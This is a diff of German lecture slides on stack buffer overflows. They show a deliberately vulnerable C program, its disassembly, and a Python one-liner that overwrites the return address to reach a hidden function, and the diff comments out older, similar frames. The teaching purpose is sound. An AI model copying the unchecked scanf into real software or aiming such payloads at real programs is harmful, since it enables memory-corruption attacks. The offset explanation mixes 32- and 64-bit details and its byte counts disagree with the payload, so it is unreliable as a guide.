@@ -124,6 +124,28 @@
     language=SQL
 }
 
+
+\lstdefinestyle{C2Style}{
+    % backgroundcolor=\color{backgroundColour},
+    commentstyle=\color{mGreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{mGray},
+    stringstyle=\color{mPurple},
+    basicstyle=\scriptsize,
+    breakatwhitespace=true,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    % aboveskip=3em,
+    %numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=1,
+    language=C
+}
+
 %----------------------------------------------------------------------------------------
 %	TITLE PAGE
 %----------------------------------------------------------------------------------------
@@ -692,6 +714,76 @@
  \end{figure}
 \end{frame}
 
+\begin{frame}[fragile]{Stack Overflow - Beispiel}
+  Wir betrachten folgende Programm:
+  \begin{lstlisting}[style=C2Style]
+    #include <stdio.h>
+
+    void secretFunction(){
+        printf("Congratulations!\n");
+        printf("You have entered in the secret function!\n");
+    }
+
+    void brokenFunction(){
+        char buffer[20];
+        printf("Enter some text:\n");
+        scanf("%s", buffer);
+        printf("You entered: %s\n", buffer);    
+    }
+
+    int main(){
+        brokenFunction();
+        return 0;
+    }
+
+  \end{lstlisting}
+  Unsere Ziel ist die Funktion secretFunction() aufrufen onhe directe Befehl dazu
+\end{frame}
+
+\begin{frame}[fragile]{Stack Overflow - Beispiel}
+  Mit Hilfe des Programs objdump, schauen wir Assemble-code von unsere Program.
+
+  \begin{lstlisting}[style=C2Style]
+    objdump -d vuln
+  \end{lstlisting}
+
+  \includegraphics[width=\textwidth]{buffer-1.png}
+\end{frame}
+
+\begin{frame}[fragile]{Stack Overflow - Beispiel}
+  Was k\"onen wir aus dem Assemblercode bestimmen:
+
+  \begin{itemize}
+    \item Die Adresse von secretFunction ist 00000000004005d6 in Hex. 
+    \begin{lstlisting}[style=C2Style]
+      00000000004005d6 <secretFunction>:
+    \end{lstlisting}
+    \item Die Adresse des Puffers beginnt 0x20 = 32 in Dezimal-Bytes vor \%ebp. Dies bedeutet, dass 32 Bytes für den Puffer reserviert sind, obwohl wir nach 20 Bytes gefragt haben.
+    \begin{lstlisting}[style=C2Style]
+      4005f5: 48 83 ec 20 sub $0x20,%rsp
+    \end{lstlisting}
+  \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]{Stack Overflow - Beispiel}
+  Jetzt wissen wir, dass 32 Bytes für den Puffer reserviert sind, es ist direkt neben \%ebp. Daher speichern die nächsten 4 Bytes den \%ebp und die nächsten 4 Bytes speichern die Rückkehradresse (die Adresse, zu der \%eip nach Abschluss der Funktion springen wird). Die ersten 28 + 4 = 32 Bytes wären beliebige zufällige Zeichen und die nächsten 4 Bytes sind die Adresse der secretFunction.
+
+  \begin{itemize}
+    \item Wir erstellen ein Inputfile mit Sprungaddress
+    \begin{lstlisting}[style=C2Style]
+      python -c 'print "a"*36 + "\x00\x00\x00\x00\xD6\x05\x40\x00"' > input.txt
+    \end{lstlisting}
+    \item Wir benutzen input.txt als Eingabedatei:
+    \begin{lstlisting}[style=C2Style]
+      ./prog < input.txt
+    \end{lstlisting}
+    \item Das Ergebnis:
+    \includegraphics[width=\textwidth]{buffer-2.png}
+  \end{itemize}
+
+\end{frame}
+
 \subsubsection{Heap Overflows}
 
 \begin{frame}[fragile]{Buffer Overflows - Heap Overflows}
@@ -722,84 +814,84 @@
   \includegraphics[scale=0.25]{integer_overflow}
 \end{frame}
 
-\begin{frame}[fragile]{Buffer Overflows -Programm I}
-  \begin{lstlisting}[style=CStyle]
-  void secretFunction()
-  {
-    printf("Congratulations!\n");
-    printf("You have entered in the secret function!\n");
-  }
+% \begin{frame}[fragile]{Buffer Overflows -Programm I}
+%   \begin{lstlisting}[style=CStyle]
+%   void secretFunction()
+%   {
+%     printf("Congratulations!\n");
+%     printf("You have entered in the secret function!\n");
+%   }
 
-  void echo()
-  {
-    char buffer[20];
+%   void echo()
+%   {
+%     char buffer[20];
 
-    printf("Enter some text:\n");
-    scanf("%s", buffer);
-    printf("You entered: %s\n", buffer);
-  }
+%     printf("Enter some text:\n");
+%     scanf("%s", buffer);
+%     printf("You entered: %s\n", buffer);
+%   }
 
-  int main()
-  {
-    echo();
+%   int main()
+%   {
+%     echo();
 
-    return 0;
-  }
-  \end{lstlisting}
-\end{frame}
+%     return 0;
+%   }
+%   \end{lstlisting}
+% \end{frame}
 
-\begin{frame}[fragile]{Buffer Overflows -Programm II}
-  Compilieren f\"ur 32 bit:
-  \begin{lstlisting}[style=BashStyle]
-  gcc vuln.c -o vuln -fno-stack-protector -m32
-  \end{lstlisting}
+% \begin{frame}[fragile]{Buffer Overflows -Programm II}
+%   Compilieren f\"ur 32 bit:
+%   \begin{lstlisting}[style=BashStyle]
+%   gcc vuln.c -o vuln -fno-stack-protector -m32
+%   \end{lstlisting}
 
-  Normale Eingabe:
-  \begin{lstlisting}[style=BashStyle]
-  Enter some text:
-  HackIt!
-  You entered: HackIt!
-  \end{lstlisting}
+%   Normale Eingabe:
+%   \begin{lstlisting}[style=BashStyle]
+%   Enter some text:
+%   HackIt!
+%   You entered: HackIt!
+%   \end{lstlisting}
 
-  \includegraphics[scale=0.5]{stack}
-\end{frame}
+%   \includegraphics[scale=0.5]{stack}
+% \end{frame}
 
-\begin{frame}[fragile]{Buffer Overflows -Programm III}
-  Anzeigen des Disassembly:
-  \begin{lstlisting}[style=BashStyle]
-  objdump -d vuln
-  \end{lstlisting}
-  \begin{figure}%
-   \centering
-   {\includegraphics[scale=0.1]{buf_c_1}}%
-   \quad
-   {\includegraphics[scale=0.1]{buf_c_2}}%
-  \end{figure}
-\end{frame}
+% \begin{frame}[fragile]{Buffer Overflows -Programm III}
+%   Anzeigen des Disassembly:
+%   \begin{lstlisting}[style=BashStyle]
+%   objdump -d vuln
+%   \end{lstlisting}
+%   \begin{figure}%
+%    \centering
+%    {\includegraphics[scale=0.1]{buf_c_1}}%
+%    \quad
+%    {\includegraphics[scale=0.1]{buf_c_2}}%
+%   \end{figure}
+% \end{frame}
 
-\begin{frame}[fragile]{Buffer Overflows -Programm IV}
-  \begin{itemize}
-    \item Adresse von \textit{secretFunction} ist \textbf{0000059d}
-    \item 38 in hex oder 56 in dezimal reserviert f\"ur lokale variablen der echo Funktion.
-    \item 28 bytes sind f\"ur Buffer reserviert.
-  \end{itemize}
+% \begin{frame}[fragile]{Buffer Overflows -Programm IV}
+%   \begin{itemize}
+%     \item Adresse von \textit{secretFunction} ist \textbf{0000059d}
+%     \item 38 in hex oder 56 in dezimal reserviert f\"ur lokale variablen der echo Funktion.
+%     \item 28 bytes sind f\"ur Buffer reserviert.
+%   \end{itemize}
 
-  \textbf{Payload:}
-  \newline
-  Die ersten 28+4=32 bytes sind zuf\"llige Chars und die n\"achsten 4 bytes die Addresse der \textit{secretFunction}.
-  \begin{lstlisting}[style=BashStyle]
-  python -c 'print "a"*32 + "\x00\x00\x05\x9d"' | ./vuln
-  \end{lstlisting}
+%   \textbf{Payload:}
+%   \newline
+%   Die ersten 28+4=32 bytes sind zuf\"llige Chars und die n\"achsten 4 bytes die Addresse der \textit{secretFunction}.
+%   \begin{lstlisting}[style=BashStyle]
+%   python -c 'print "a"*32 + "\x00\x00\x05\x9d"' | ./vuln
+%   \end{lstlisting}
 
-  Ausgabe:
-  \begin{lstlisting}[style=BashStyle]
-  Enter some text:
-  You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<rubbish 3 bytes>
-  Congratulations!
-  You have entered in the secret function!
-  Illegal instruction (core dumped)
-  \end{lstlisting}
-\end{frame}
+%   Ausgabe:
+%   \begin{lstlisting}[style=BashStyle]
+%   Enter some text:
+%   You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<rubbish 3 bytes>
+%   Congratulations!
+%   You have entered in the secret function!
+%   Illegal instruction (core dumped)
+%   \end{lstlisting}
+% \end{frame}
 
 %----------------------------------------------------------------------------------------
 %	Sources
